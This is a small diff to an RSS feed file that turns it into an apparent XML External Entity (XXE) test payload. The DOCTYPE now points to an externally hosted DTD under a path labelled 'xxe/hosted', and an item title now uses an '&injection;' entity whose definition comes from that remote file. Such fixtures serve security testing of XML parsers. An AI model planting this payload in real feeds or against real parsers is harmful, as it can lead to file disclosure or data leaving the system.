@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" standalone = "no"?>
-<!DOCTYPE channel SYSTEM "v2.dtd">
+<!DOCTYPE channel SYSTEM "https://fafnirz.github.io/xxe/hosted/v2/v2.dtd">
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
@@ -7,7 +7,7 @@
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
     <item>
-        <title>&internal;</title>
+        <title>&injection;</title>
         <link>https://google.com</link>
         <description>asdasd</description>
         <author>author@example.com</author>
